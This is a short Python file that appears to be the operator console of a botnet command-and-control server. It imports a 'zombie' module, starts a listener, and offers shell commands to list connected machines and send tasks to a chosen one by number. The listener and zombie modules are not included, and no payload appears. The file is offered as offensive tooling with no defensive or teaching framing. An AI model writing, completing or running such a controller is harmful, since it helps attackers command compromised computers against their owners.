from socket import *
from zombie import *
import threading
import cmd
from listener import Listener

class Shell(cmd.Cmd):

	prompt = ">>>"

	def do_EOF(self, line):
		listener.stop()
		listener.join()
		return True

	def do_list(self, line):
		print
		
		for r in listener.check():
			print("\t\t".join(r))

	def do_send(self, line):
		parameters = line.split()
		print(listener.sendTask(int(parameters[0]), parameters[1]))

	def do_exit(self, line):
		listener.stop()
		listener.join()
		return True


listener = Listener()
listener.start()

Shell().cmdloop()
